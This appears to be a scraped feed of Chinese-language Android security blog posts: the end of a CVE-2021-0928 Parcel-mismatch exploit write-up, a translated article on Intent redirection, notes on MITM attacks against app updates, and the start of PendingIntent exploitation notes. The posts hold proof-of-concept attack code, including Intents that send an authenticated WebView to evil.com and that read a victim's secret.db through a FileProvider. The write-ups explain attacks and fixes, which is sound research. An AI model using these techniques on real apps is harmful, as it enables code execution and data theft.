dest.writeInt(mIsMultiResolution ? 1 : 0); // New in Android 12 dest.writeList(mSensorPixelModesUsed); // New in Android 12 } private ArrayList&lt;Surface&gt; mSurfaces; private final int mRotation; private final int mSurfaceGroupId; private final int mSurfaceType; private final Size mConfiguredSize; private final int mConfiguredFormat; private final int mConfiguredDataspace; private final int mConfiguredGenerationId; private final boolean mIsDeferredConfig; private boolean mIsShared; private String mPhysicalCameraId; private boolean mIsMultiResolution; // New in Android 12 private ArrayList&lt;Integer&gt; mSensorPixelModesUsed; // New in Android 12} 如前面讨论WindowContainerTransaction例子时所说，readList实际上可以用Parcel支持的任何对象来填充列表，而不仅仅是符合通用声明的对象（ArrayList&lt;Integer&gt;）。然而，由于我们只是将这个类作为序列化小工具链的一部分，而不是真正使用它，除了读写Parcel，这个字段不会被用于其他任何事情（而使用ArrayList中的元素，而这些元素与它的泛型声明不匹配，无论如何都只会导致ClassCastException）。 在这个类中，createFromParcel中也有一个try-catch，这意味着如果在读取过程中抛出一个异常，对OutputConfiguration的读取将被停止，对包含OutputConfiguration的对象的读取将继续进行。当这种情况发生时，整个OutputConfiguration将被写入Parcel，但它将只被读到异常发生的点。这就造成了不匹配。 为了构建这样的Parcelable，现在需要找到一些东西放在mSensorPixelModesUsed中，在system_server中成功读取（因为这个对象是通过Parcel从攻击者应用中接收的），在system_server中成功写入，然后在受害者应用中解析Parcel失败并抛出一个Exception。 其中一个方法是使用存在于system_server中但不在应用程序中的类，这样尝试反序列化它就会导致ClassNotFoundException。但是不能从system_server中Parcelable，因为readParcelable没有明确指定ClassLoader只会搜索BOOTCLASSPATH（BOOTCLASSPATH不包含system_server中特定的类）。解决方法是使用一个可序列化的类，因为ObjectInputStream会从堆栈中第一个非BOOTCLASSPATH方法中挑选ClassLoader。 这里选择PackageManagerException，然而在使用它之前，还需要做一件事。在OutputConfiguration构造函数中，当readList被调用时，参数loader被明确设置为Integer.class.getClassLoader()。loader被传播到readValue()，然后到readSerializable()，如果loader不为空的，它就会被用来代替来自ObjectInputStream的resolveClass（c != null检查没有任何作用，因为当Class.forName没有找到类时，它会抛出异常而不是返回空）。 思路是将PackageManagerException包裹在一些Parcelable中，在不指定ClassLoader的情况下进行readList。 因此有以下对象： OutputConfiguration mSensorPixelModesUsed.get(0) = WindowContainerTransaction mHierarchyOps.get(0) = PackageManagerException 现在这样的对象可以在system_server中成功反序列化：当WindowContainerTransaction调用readList时，它会尝试使用system_server的ClassLoader（不是BootClassLoader）找到PackageManagerException类，因为它可以在堆栈跟踪中找到它。该类加载器恰好出现在堆栈跟踪中，但以下所有方法都不在system_server类路径中：Binder#execTransact()、AIDL生成的IActivityManager$Stub#onTransact()以及所有使用的Parcelable类的方法，但在堆栈跟踪中，有一个在system_server中声明的方法：在ActivityManagerService中重写的onTransact。因此，system_server可以读取并随后将这样的对象写入Parcel，当目标应用程序试图读取它时，PackageManagerException类将不可用，因此ClassNotFoundException将被抛出，被包装成RuntimeException，然后被OutputConfiguration的 CREATOR捕获。 但是还没有触发不匹配，因为OutputConfiguration.writeToParcel没有留下任何未读数据时，异常被捕获了，但是可以很容易地在mSensorPixelModesUsed列表中添加另一个项目，该项目将通过Parcel.writeValue写入，并在读取OutputConfiguration后留下未读数据。 从Intent对象中触发 因为它将被system_server传递到AIDL方法中，该方法的第一个参数是Intent，第二个参数是执行信息，所以第一个参数中传递的Intent的序列化/反序列化会导致第二个参数中的值被改变。 在Intent.readFromParcel()中，所有的值都是通过专门的类型方法来读取的，所以在这里不能指定自定义的Parcelable类。 在Intent中，有一个嵌套的ClipData，并且从Android 12开始，在ClipData$Item中有一个新的字段ActivityInfo mActivityInfo。（这里是引入这个字段的提交，这个字段是在ClipData(Parcel in)构造函数中通过in.readTypedObject(ActivityInfo.CREATOR)读取的） 然后在ActivityInfo(Parcel source)构造函数中，也没有办法放入自定义的Parcelable，但是由于ActivityInfo是从ComponentInfo扩展而来，它有applicationInfo字段。 最后，在 ApplicationInfo 中有一个 SparseArray&lt;int[]&gt; splitDependencies 字段，它是通过 readSparseArray 读取的，而后者又使用 readValue 来读取 SparseArray 项目。 可以将OutputConfiguration放在splitDependencies中，但是读取splitDependencies之后会有一些readString8()的调用，而且在发生不匹配之后，最好能完全控制未被接受的数据，这样我们就可以直接将空字符串放在那里，而不用担心未被接受的数据的不同解释。 要做到这一点，首先需要在OutputConfiguration.mSensorPixelModesUsed中放置一些原始数据，这些数据将通过writeValue写入。这里选择使用Bundle。这样，在未消耗的数据中，会留下： writeValue VAL_BUNDLE标签 原始数据的长度（此链接也适用于此列表中的其余项目） BUNDLE_MAGIC 通过Parcel.appendFrom逐字传递的原始数据 所以我们有三个Parcel.writeInt的项目没有消耗掉，我们可以通过将OutputConfiguration包裹在一些Parcelable中，在读取时读取任意的Parcelable值和三个ints，来摆脱它们。ZenPolicy CREATOR中存在这样的方法。 最后，我们有以下对象的层次结构（存在于system_server中，并且它试图传递给scheduleReceiver）： Intent mClipData = ClipData mItems.get(0).mActivityInfo = ActivityInfo applicationInfo = ApplicationInfo splitDependencies.get(0) = ZenPolicy mVisualEffects.get(0) = OutputConfiguration mSensorPixelModesUsed.get(0) = WindowContainerTransaction mHierarchyOps.get(0) = PackageManagerException mSensorPixelModesUsed.get(1) = Bundle 这是由system_server写的。然后，接收应用程序正常读取PackageManagerException的所有数据（包括readSerializable数据），然而在读取PackageManagerException的Serializable数据后，一个异常被抛出，并且取消了对OutputConfiguration以下所有数据的读取，留下Bundle未读。读取继续进行到ZenPolicy，它消耗了Bundle中原始数据之前的三个ints。然后ApplicationInfo的读取继续进行，读取的数据是之前在Bundle中逐字传递的原始数据。对原始数据的读取将在这个堆栈中的其他对象（ApplicationInfo、ActivityInfo、ClipData和Intent）中继续进行，然后这些原始数据将被用于读取下一个handleReceiver方法参数。 handleReceiver 正如刚才所说，现在剩下的scheduleReceiver参数是从攻击者控制的缓冲区中读取的。首先，scheduleReceiver将所有参数的值打包并使用sendMessage()将执行传递给主线程。接下来，在主线程上调用handleReceiver，handleReceiver调用getPackageInfoNoCheck，将其作为ActivityInfo的一部分传递给scheduleReceiver参数的ApplicationInfo。 getPackageInfo检查给定名称的包是否已经存在于缓存中，如果没有，则构建新的LoadedApk实例，将先前收到的ApplicationInfo对象传递给它。（由于想要创建新的LoadedApk，所以在这个过程中使用了先前没有看到的包的包名） 然后使用ContextImpl.getClassLoader()方法，该方法首先委托给mPackageInfo.getClassLoader()，mPackageInfo是在上一段构建的LoadedApk。 然后是``createOrUpdateClassLoaderLocked，它调用makePaths将ClassLoader中要使用的路径填充到zipPaths中，然后将它们连接起来并分配给zip变量，再传递给createClassLoader`。 makePaths使用ApplicationInfo的信息填充zipPaths，最重要的是，这包括sourceDir。攻击者应用程序使注入的ApplicationInfo与sourceDir设置为自己的apk的路径，因此receiver类将实际从攻击者apk中加载。这直接导致了在接收广播的应用程序中执行攻击者控制的代码。 隐藏的API检查 还有一件事需要被绕过：隐藏的API检查。但这些不是问题（因为应用程序可以使用NDK，并直接调用底层系统调用），但在这种情况下，通过手动将数据写入Parcel，然后使用readParcelable来构建精心制作的ClipData来绕过它们。这样的ClipData通常可以被附在Intent上，然后传递给sendBroadcast()，因此发送广播本身只需使用公共API即可完成。 修复Android 12发布： 从OutputConfiguration和相关类中删除了异常捕获功能。 OutputConfiguration#mSensorPixelModesUsed不再通过writeValue写入。 ClipData#mActivityInfo不再被写入Parcel，除非在写入过程中明确要求（因此Intent不再包含来自BOOTCLASSPATH的任意Parcelables，消除了这种利用技术）。 在写这篇文章时，只出现在主分支上，不在发布的版本中，可能会出现在Android 13中（不在12L中）： 在Parcel上有新的List读取方法，可以检查元素的类型，没有类型的版本已经被标记为废弃。 新的方法Parcel#enforceNoDataAvail()，检查Parcel中是否有未读的数据，显然AIDL在读取RPC调用参数后会使用这个方法。 在Bundle中的每个项目都将单独保存其长度。这几乎扼杀了整个bug类。","link":"/2022/04/22/Android-CVE-2021-0928/"},{"title":"Android Intent 重定向漏洞","text":"前言 原文链接：https://blog.oversecured.com/Android-Access-to-app-protected-components/ 由于Intent类是Parcelable，属于这个类的对象可以作为额外的数据传递到另一个Intent对象中。许多开发者利用这一特性，创建了代理组件（活动、广播接收器和服务），这些代理组件采取嵌入式Intent，并将其传递给危险的方法，如startActivity(…), sendBroadcast(…)等。攻击者可以强迫应用程序启动一个不能从其他应用程序直接启动的非导出组件，或者让攻击者访问其内容提供者。WebView有时也会使用Intent.parseUri(…)方法，将URL从字符串变为Intent对象，并将其传递给startActivity(…)。 例子如下的AndroidManifest.xml所示： 12&lt;activity android:name=&quot;.ProxyActivity&quot; android:exported=&quot;true&quot; /&gt;&lt;activity android:name=&quot;.AuthWebViewActivity&quot; android:exported=&quot;false&quot; /&gt; Activity ProxyActivity 1startActivity((Intent) getIntent().getParcelableExtra(&quot;extra_intent&quot;)); Activity AuthWebViewActivity 1webView.loadUrl(getIntent().getStringExtra(&quot;url&quot;), getAuthHeaders()); AuthWebViewActivity是执行某些不安全操作的隐藏应用程序功能的示例，在这种情况下，将用户的身份验证会话传递给从url参数获取的 URL。 出口限制意味着攻击者无法直接访问AuthWebViewActivity。如果直接调用AuthWebViewActivity： 1234Intent intent = new Intent();intent.setClassName(&quot;com.victim&quot;, &quot;com.victim.AuthWebViewActivity&quot;);intent.putExtra(&quot;url&quot;, &quot;http://evil.com/&quot;);startActivity(intent); 抛出一个java.lang.SecurityException，由于Permission Denial: AuthWebViewActivity not exported from uid 1337。 但攻击者可以通过ProxyActivity启动AuthWebViewActivity： 12345678Intent extra = new Intent();extra.setClassName(&quot;com.victim&quot;, &quot;com.victim.AuthWebViewActivity&quot;);extra.putExtra(&quot;url&quot;, &quot;http://evil.com/&quot;);Intent intent = new Intent();intent.setClassName(&quot;com.victim&quot;, &quot;com.victim.ProxyActivity&quot;);intent.putExtra(&quot;extra_intent&quot;, extra);startActivity(intent); 并且不会出现安全违规，因为受到攻击的应用程序确实可以访问它自己的所有组件。使用此代码片段，攻击者可以绕过 Android 系统的内置限制。 攻击升级Content Provider除了访问原始应用程序的任意组件外，攻击者还可以尝试访问满足以下条件的应用程序的Content Provider： 它必须是非导出的（否则它可能会被直接攻击） 它必须将android:grantUriPermissions标志设置为true. 攻击者必须将自己设置为嵌入式intent的接收者并设置以下标志 Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION ，允许对Provider的持久访问（没有这个标志，访问是一次性的） Intent.FLAG_GRANT_PREFIX_URI_PERMISSION，允许通过前缀进行 URI 访问——例如访问content://com.victim.provider/image/1，攻击者可以使用 URI 授予对所有提供者内容（content://com.victim.provider/）的访问权限，然后使用ContentResolver来寻找content://com.victim.provider/image/1、content://com.victim.provider/image/2等等，而不是使用完整路径重复获得单独的访问权限。 Intent.FLAG_GRANT_READ_URI_PERMISSION，允许对提供程序进行读取操作（例如query, openFile, openAssetFile） Intent.FLAG_GRANT_WRITE_URI_PERMISSION ，允许写操作 一个典型的Provider的例子，攻击者可以访问它并执行常规操作，如query, update, insert, delete, openFile,openAssetFile 1&lt;provider android:name=&quot;com.victim.ContentProvider&quot; android:exported=&quot;false&quot; android:authorities=&quot;com.victim.provider&quot; android:grantUriPermissions=&quot;true&quot;/&gt; 盗取用户图片文件示例，AndroidManifest.xml： 1&lt;activity android:name=&quot;.LeakActivity&quot; android:exported=&quot;true&quot; /&gt; MainActivity.java 文件： 123456789101112Intent extra = new Intent();extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);extra.setClassName(getPackageName(), &quot;com.attacker.LeakActivity&quot;);extra.setData(Uri.parse(&quot;content://com.victim.provider/&quot;));Intent intent = new Intent();intent.setClassName(&quot;com.victim&quot;, &quot;com.victim.ProxyActivity&quot;);intent.putExtra(&quot;extra_intent&quot;, extra);startActivity(intent); LeakActivity.java： 12Uri uri = Uri.parse(getIntent().getDataString() + &quot;image/1&quot;)); // content://com.victim.provider/image/1Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image File Provider此漏洞使攻击者有可能窃取位于开发人员预定目录中的应用程序文件。为了成功攻击，恶意应用需要获得对 Android File Provider 的访问权限，然后使用 Android ContentResolver 从File Provider中读取内容。 123&lt;provider android:name=&quot;androidx.core.content.FileProvider&quot; android:exported=&quot;false&quot; android:authorities=&quot;com.victim.files_provider&quot; android:grantUriPermissions=&quot;true&quot;&gt; &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/provider_paths&quot;/&gt;&lt;/provider&gt; 它提供对可以在应用程序资源中找到的特殊列表中的文件的读/写访问权限，在本例中位于 res/xml/provider_paths.xml 它可能看起来有点像 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;paths&gt; &lt;root-path name=&quot;root&quot; path=&quot;&quot;/&gt; &lt;files-path name=&quot;internal_files&quot; path=&quot;.&quot;/&gt; &lt;cache-path name=&quot;cache&quot; path=&quot;&quot;/&gt; &lt;external-path name=&quot;external_files&quot; path=&quot;images&quot;/&gt;&lt;/paths&gt; 每个标签指定一个根目录，其path值相对于根目录。例如，该值external_files将对应于new File(Environment.getExternalStorageDirectory(), &quot;images&quot;) 该值root-path对应于/，即提供对任意文件的访问。 假设我们在文件中存储了一些秘密数据/data/data/com.victim/databases/secret.db：该文件的窃取可能看起来像这样 MainActivity.java： 123456789Intent extra = new Intent();extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);extra.setClassName(getPackageName(), &quot;com.attacker.LeakActivity&quot;);extra.setData(Uri.parse(&quot;content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db&quot;));Intent intent = new Intent();intent.setClassName(&quot;com.victim&quot;, &quot;com.victim.ProxyActivity&quot;);intent.putExtra(&quot;extra_intent&quot;, extra);startActivity(intent); LeakActivity.java： 1InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server Webview一个 Intent 对象可以通过Intent.toUri(flags)被转换为一个字符串，然后使用Intent.parseUri(stringUri, flags)再转换为Intent。此功能通常用于 WebView（应用程序的内置浏览器）：应用程序可以验证intent://方案，将 URL 解析为 Intent 并启动活动。 可以通过客户端应用程序中的其他漏洞（例如，直接通过导出的活动或通过deeplink机制在 WebView 中打开应用程序内任意链接的能力）和远程利用此漏洞，包括服务器上的跨站脚本攻击或客户端上的中间人攻击。 易受攻击的代码示例： 12345678public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) { Uri uri = request.getUrl(); if(&quot;intent&quot;.equals(uri.getScheme())) { startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME)); return true; } return super.shouldOverrideUrlLoading(view, request);} 这里的重点是，WebViewClient类的shouldOverrideUrlLoading(...)方法在每次WebView试图加载一个新的链接时被调用，但给应用程序提供了添加自定义处理程序的选择。 要利用此漏洞，攻击者需要创建一个 WebView 重定向到一个专门准备的intent-scheme URL。URL 创建示例： 1234Intent intent = new Intent();intent.setClassName(&quot;com.victim&quot;, &quot;com.victim.AuthWebViewActivity&quot;);intent.putExtra(&quot;url&quot;, &quot;http://evil.com/&quot;);Log.d(&quot;evil&quot;, intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs &quot;intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot; 示例攻击： 1location.href = &quot;intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;; 与漏洞的经典版本相比，该版本包含几个限制： 嵌入的Parcelable和Serializable对象不能被转换为字符串（它们将被忽略） Intent.FLAG_GRANT_READ_URI_PERMISSION和Intent.FLAG_GRANT_WRITE_URI_PERMISSION的不安全标志在调用Intent.parseUri(...)时被忽略。只有当Intent.URI_ALLOW_UNSAFE(startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))标志被设置时，解析器才会留下它们，这非常罕见 许多开发人员仍然忘记对通过 WebView 接收到的意图进行完整过滤： 12345678910public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) { Uri uri = request.getUrl(); if(&quot;intent&quot;.equals(uri.getScheme())) { Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME); intent.addCategory(&quot;android.intent.category.BROWSABLE&quot;); intent.setComponent(null); startActivity(intent); return true; } return super.shouldOverrideUrlLoading(view, request); 攻击者可以通过选择器指定一个未导出的组件： 1234Intent intent = new Intent();intent.setSelector(new Intent().setClassName(&quot;com.victim&quot;, &quot;com.victim.AuthWebViewActivity&quot;));intent.putExtra(&quot;url&quot;, &quot;http://evil.com/&quot;);Log.d(&quot;evil&quot;, intent.toUri(Intent.URI_INTENT_SCHEME)); // &quot;intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end&quot; 并绕过应用程序对Intent的保护。因此，我们建议也过滤选择器： 123intent.addCategory(&quot;android.intent.category.BROWSABLE&quot;);intent.setComponent(null);intent.setSelector(null); 但即使完全过滤也不能保证完全保护，因为攻击者可以创建与intent-filter某些未导出activity相对应的隐式意图。活动声明示例： 1234567&lt;activity android:name=&quot;.AuthWebViewActivity&quot; android:exported=&quot;false&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt; &lt;data android:scheme=&quot;victim&quot; android:host=&quot;secure_handler&quot; /&gt; &lt;/intent-filter&gt;&lt;/activity&gt; 1webView.loadUrl(getIntent().getData().getQueryParameter(&quot;url&quot;), getAuthHeaders()); 其他方法一些应用程序开发人员实现自己的intent-filter（通常用于处理deeplink或推送消息），使用例如 JSON 对象、字符串或字节数组，它们要么与默认值没有区别，要么存在很大的危险，因为它们可能会扩展对象Serializable和Parcelable，还允许设置不安全的标志。安全研究人员还可能会遇到更奇特的Intent创建，例如将字节数组转换为一个 Parcel，然后从中读取Intent。 1234567Uri deeplinkUri = getIntent().getData();if(deeplinkUri.toString().startsWith(&quot;deeplink://handle/&quot;)) { byte[] handle = Base64.decode(deeplinkUri.getQueryParameter(&quot;param&quot;), 0); Parcel parcel = Parcel.obtain(); parcel.unmarshall(handle, 0, handle.length); startActivity((Intent) parcel.readParcelable(getClassLoader()));}","link":"/2022/01/21/Android-Intent-%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E/"},{"title":"Android中间人攻击方法整理","text":"前言这里的目标是汇总一些，Android平台上的，基于中间人的，用于植入恶意代码的攻击方法的一个整理，也可以用于其他平台。 能够进行劫持，大部分都是因为使用了HTTP协议。利用的基本思路是： 部署中间人设备； 监听网络流量； 当目标请求服务器时，劫持该请求，并响应恶意文件。 具体可以参考这个专利。 APP升级过程劫持APP版本升级时一般是请求升级接口，如果有升级，服务端返回一个下载地址，下载好APK后，再点击安装。其中，这里有三个地方可以进行劫持，请求升级时、下载文件时和安装时。 请求升级API如果使用的是HTTP请求，可以进行劫持，返回一个恶意下载地址。 解决方案：建议使用HTTPS。 下载API还是HTTP请求。 解决方案：HTTPS，对服务端返回的文件进行hash校验，还有服务端返回的key进行校验。 安装在安装时，安装的文件路径被修改了，可能安装了其他奇怪的东西。 解决方案：对APK文件进行包名和签名验证。 安全开发的例子🌰1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586public class UpgradeModel { private int code; private String msg; private DataBean data; public int getCode() { return code; } public void setCode(int code) { this.code = code; } public String getMsg() { return msg; } public void setMsg(String msg) { this.msg = msg; } public DataBean getData() { return data; } public void setData(DataBean data) { this.data = data; } public static class DataBean { private String description; private String downUrl; private String version; private String hashcod; private String key; private String isForce; public String getDescription() { return description; } public void setDescription(String description) { this.description = description; } public String getDownUrl() { return downUrl; } public void setDownUrl(String downUrl) { this.downUrl = downUrl; } public String getVersion() { return version; } public void setVersion(String version) { this.version = version; } public String getHashcod() { return hashcod; } public void setHashcod(String hashcod) { this.hashcod = hashcod; } public String getKey() { return key; } public void setKey(String key) { this.key = key; } public String getIsForce() { return isForce; } public void setIsForce(String isForce) { this.isForce = isForce; } }} 请求 12345678UpgradeModel aResult = xxxx//解析服务器返回的后数据if (aResult != null &amp;&amp; aResult.getData() != null ) { String url = aResult.getData().getDownUrl(); if (url == null || !TextUtils.equals(url, &quot;这里是你知道的下载地址：也可以只验证hostUrl&quot;)) { // 如果符合，说明不是目标下载地址，就不去下载 } 下载 12345File file = DownUtils.getFile(url); // 监测是否要重新下载if (file.exists() &amp;&amp; TextUtils.equals(aResult.getData().getHashCode(), EncryptUtils.Md5File(file))) &amp;&amp; TextUtils.equals(aResult.getData().getKey(), DownLoadModel.getData().getKey()) {/ // 如果符合，就去安装 不符合重新下载 删除恶意文件} 安装 123456789101112131415161718192021222324252627282930/** installApK* @param context* @param path* @param name*/public static void installApK(Context context, final String path, final String name ) { if (!SafetyUtils.checkFile(path + name, context)) { return; } if (!SafetyUtils.checkPagakgeName(context, path + name)) { Toast.makeText(context, &quot;升级包被恶意软件篡改 请重新升级下载安装&quot;, Toast.LENGTH_SHORT ).show(); DLUtils.deleteFile(path + name); ((Activity)context).finish(); return; } switch (SafetyUtils.checkPagakgeSign(context, path + name)) { case SafetyUtils.SUCCESS: DLUtils.openFile(path + name, context); break; case SafetyUtils.SIGNATURES_INVALIDATE: Toast.makeText(context, &quot;升级包安全校验失败 请重新升级&quot;, Toast.LENGTH_SHORT ).show(); ((Activity)context).finish(); break; case SafetyUtils.VERIFY_SIGNATURES_FAIL: Toast.makeText(context, &quot;升级包为盗版应用 请重新升级&quot;, Toast.LENGTH_SHORT ).show(); ((Activity)context).finish(); break; default: break; }} 安全校验 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103/*** 安全校验* Created by LIUYONGKUI on 2016-04-21.*/public class SafetyUtils { /** install sucess */ protected static final int SUCCESS = 0; /** SIGNATURES_INVALIDATE */ protected static final int SIGNATURES_INVALIDATE = 3; /** SIGNATURES_NOT_SAME */ protected static final int VERIFY_SIGNATURES_FAIL = 4; /** is needcheck */ private static final boolean NEED_VERIFY_CERT = true; /** * checkPagakgeSigns. */ public static int checkPagakgeSign(Context context, String srcPluginFile) { PackageInfo PackageInfo = context.getPackageManager() .getPackageArchiveInfo(srcPluginFile, 0); //Signature[] pluginSignatures = PackageInfo.signatures; Signature[] pluginSignatures = PackageVerifyer.collectCertificates(srcPluginFile, false); boolean isDebugable = (0 != (context.getApplicationInfo().flags &amp; ApplicationInfo.FLAG_DEBUGGABLE)); if (pluginSignatures == null) { PaLog.e(&quot;签名验证失败&quot;, srcPluginFile); new File(srcPluginFile).delete(); return SIGNATURES_INVALIDATE; } else if (NEED_VERIFY_CERT &amp;&amp; !isDebugable) { //可选步骤，验证APK证书是否和现在程序证书相同。 Signature[] mainSignatures = null; try { PackageInfo pkgInfo = context.getPackageManager() .getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES); mainSignatures = pkgInfo.signatures; } catch (PackageManager.NameNotFoundException e) { e.printStackTrace(); } if (!PackageVerifyer.isSignaturesSame(mainSignatures, pluginSignatures)) { PaLog.e(&quot;升级包证书和旧版本证书不一致&quot;, srcPluginFile); new File(srcPluginFile).delete(); return VERIFY_SIGNATURES_FAIL; } } return SUCCESS; } /** * checkPagakgeName * @param context * @param srcNewFile * @return */ public static boolean checkPagakgeName(Context context, String srcNewFile) { PackageInfo packageInfo = context.getPackageManager() .getPackageArchiveInfo(srcNewFile, PackageManager.GET_ACTIVITIES); if (packageInfo != null) { return TextUtils.equals(context.getPackageName(), packageInfo.packageName); } return false; } /** * checkFile * * @param aPath * 文件路径 * @param context * context */ public static boolean checkFile(String aPath, Context context) { File aFile = new File(aPath); if ((aFile == null) || !aFile.exists()) { Toast.makeText(context, &quot;安装包已被恶意软件删除&quot;, Toast.LENGTH_SHORT).show(); return false; } if (context == null) { Toast.makeText(context, &quot;安装包异常&quot;, Toast.LENGTH_SHORT).show(); return false; } return true; }} 额外的漏洞是漏洞，也算是不安全的开发方式吧。 通过 MITM 的三星 Galaxy 应用商店 RCE原文链接：https://www.adyta.pt/en/noticias/news-1/ 漏洞原理Galaxy Apps Store 检索一个特定于国家/地区的 URL 以供商店使用。此请求有时会定期发生，或者在您第一次启动应用程序时或您的 MCC（移动国家代码）发生变化时发生。但是，此请求是使用 HTTP 而不是 HTTPS 发出的，这允许 MITM（中间人）攻击。 在这个 POST 请求中，设备发送有关设备状态的信息，例如：MCC、MNC、设备型号和语言。在响应中，将返回一个CountryURL 以供 Store 使用。CountryURL 包含 HTTP URL，但应用程序将在下一个请求中使用 HTTPS。 中间人 小米预装安全App漏洞原文链接：https://research.checkpoint.com/2019/vulnerability-in-xiaomi-pre-installed-security-app/ 1、Avast更新漏洞安全APP使用Avast、AVL 和腾讯进行杀毒，默认情况下，将 Avast 设置为应用程序的安全扫描程序，应用程序通过将avast-android-vps-v4-release.apk APK 文件下载到 Guard Provider 的私有目录：/data/data/com.miui.guardprovider/app_dex/vps_update*_&lt;timestamp&gt;*.apk 来定期更新其病毒库。 但是，更新机制使用不安全的 HTTP 连接来下载此文件。 2、AVL 更新路径遍历漏洞一旦阻止与Avast服务器的连接，APP就会把默认的杀毒软件换成另一个–在这种情况下是AVL反病毒软件。 在AVL成为默认杀毒软件后，它将立即用其病毒数据库更新该应用。它通过请求一个配置文件（如https://update.avlyun.sec.miui.com/avl_antiy/miuistd/siglib/20180704.cj.conf）来检查是否存在新的病毒签名。这个`.conf`文件是纯文本格式的，表明有新签名的ZIP档案的URL、大小和MD5哈希值。 在处理完配置文件后，AVL会下载read_update_url字段中指示的zip文件，并将其解压到Guard Provider目录中。 MITM攻击者能够改变.conf文件的内容，因为它是通过非安全连接下载的，使用is_new=0来显示新的更新的存在，并提供URL链接到一个精心制作的ZIP文件。 AVL SDK还存在路径穿越漏洞，因此，攻击者能够使用精心制作的zip文件来覆盖应用程序沙盒中的任何文件。 因此，一个精心制作的APK，作为.../.../app_dex/vps_update_20190205-124933.apk条目附加到ZIP签名的存档中，将成功覆盖之前从Avast下载的更新，因为两个反病毒SDK组件在相同的沙盒中。 然后释放Avast的通信，并阻止AVL的通信，直到APP再次选择Avast作为活动的反病毒软件。由于Guard Provider对Avast更新的签名文件的校验只在下载时进行，在运行时就不再检查，恶意APK将被加载执行。","link":"/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"title":"Android PendingIntent漏洞技术","text":"前言本文主要是对OPPO子午实验室在BlackHat EU 2021上，关于PendingIntent的议题（Re-route Your Intent forPrivilege Escalation: A Universal Way to Exploit Android PendingIntents in High-profile and SystemApps）做一下笔记，具体细节的话可以在参考链接中找到。虽然这种漏洞可能已经被堵死了，但是子午实验室开源的漏扫工具却是对Android App层面的自动化漏洞挖掘有不小的启示，值得学习一下。 背景知识Intent我们知道，Intent是用于在组件支间传递的通信消息的，用于执行打开Activity、发送广播、启动服务等动作，而Intent对象内部的字段则规定了Intent发送的目的组件，以及执行动作的具体内容，包括action、category、data、clipdata、package、flag、extra、component和selector。 其中component和selector用于设置Intent的目的组件，规定Intent发送给谁。按照是否设置component和selector，Intent可划分为： • 显式Intent：具有component或者selector的Intent；• 隐式Intent：仅设置了action的Intent，注册对应action的Intent-filter的组件可以接收到Intent。 另外，还有一种特殊的空Intent：Intent new Intent()，即什么都没有。 PendingIntentPendingIntent是一种特殊的Intent，通过委托授权发送Intent进行组件间通信。 App可以使用getActivity、getBroadcast、getService等API向Android系统申请一个PendingIntent对象，例如在函数getActivity ： 参数intent构成了所⽣成PendingIntent对象的base Intent，⽽对于getActivity函数来说，base Intent应该⽤于打开Activity，否则就没有意义。后⾯的flags参数决定了PendingIntent的⾏为，例如FLAG_IMMUTABLE规定base Intent不能被改写。 然后，这个PendingIntent对象可以发送给其他App使用，其他App调用PendingIntent.send时，就能够以PendingIntent源App的身份和权限发送PendingIntent中的base Intent。其他App甚至还可以提供一个新的Intent，对base Intent进行改写。 这里需要记住的点有两个： 源App的PendingIntent是委托授权给其他App的，这意味着其他App可以以源App的身份和权限转发PendingIntent； 同时，在转发之前，其他App可以改写PendingIntent的base Intent。 使用场景PendingIntent广泛存在于SliceProviders（共享UI界面的机制）、通知(Notifications)、媒体浏览服务(MediaBrowserServices)、窗口小部件(AppWidgets)、定时器管理器(AlarmManager)当中。 利用方式什么样的PendingIntent是不安全的？ base Intent为空Intent的广播PendingIntent： 1PendingIntent.getBroadcast(context, 0, new Intent(), 0) base Intent为隐式Intent的PendingIntent： 1mPendingIntent = PendingIntent.getActivity(this, 0, new Intent(&quot;Some Action&quot;), 0); 如何改写base Intent这个机制由 Intent.fillIn 函数提供： 在上述代码中，this对象指向当前Intent，other为其他Intent。如果当前Intent中的成员变量为空，则可以被other中相应的成员变量覆盖。比较特殊的是Intent中的component和selector成员，即使当前Intent中的component和selector为空，也不能被other所改写，除非PendingIntent设置了FILL_IN_COMPONENT或者FILL_IN_SELECTOR标志。 PendingIntent重定向攻击因此在获取PendingIntent之后，其base Intent的action、category、data、clidpdata、package、flag、extra等成员都是有可能改写的，而component和selector无法改写，由于action已经被设置了，因此也无法被改写。 如何解决这个问题呢？由于package可以指定（Intent Bridge漏洞中的利用方法），我们可以通过设置intent中的flag来巧妙地解决这个问题。Intent提供了有关临时授权的标志: 